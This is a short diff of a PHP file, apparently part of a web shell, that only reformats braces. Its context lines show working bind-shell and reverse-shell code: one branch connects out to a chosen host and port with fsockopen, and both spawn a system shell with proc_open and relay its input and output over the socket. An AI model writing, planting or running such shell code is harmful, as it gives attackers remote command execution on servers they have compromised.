@@ -48,8 +48,7 @@ if($t=="bind"){
         }
         fclose($c);
         fclose($s);
-    }
-    else{
+    }else{
         fwrite($c,$m);
         $ds=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));
         $pr=proc_open($sh,$ds,$pip);
@@ -78,8 +77,7 @@ if($t=="bind"){
         fclose($s);fclose($c);fclose($pip[0]);fclose($pip[1]);fclose($pip[2]);
         proc_close($pr);
     }
-}
-elseif($t=="back"){
+}elseif($t=="back"){
     $s=fsockopen($h,$p,$en,$es,30);
     if(strtolower(substr(php_uname(),0,3))=="win"){
         fwrite($s,$m.getcwd().">");
@@ -95,8 +93,7 @@ elseif($t=="back"){
             fwrite($s,$o);
         }
         fclose($s);
-    }
-    else{
+    }else{
         fwrite($s,$m);
         $ds=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));
         $pr=proc_open($sh,$ds,$pip);
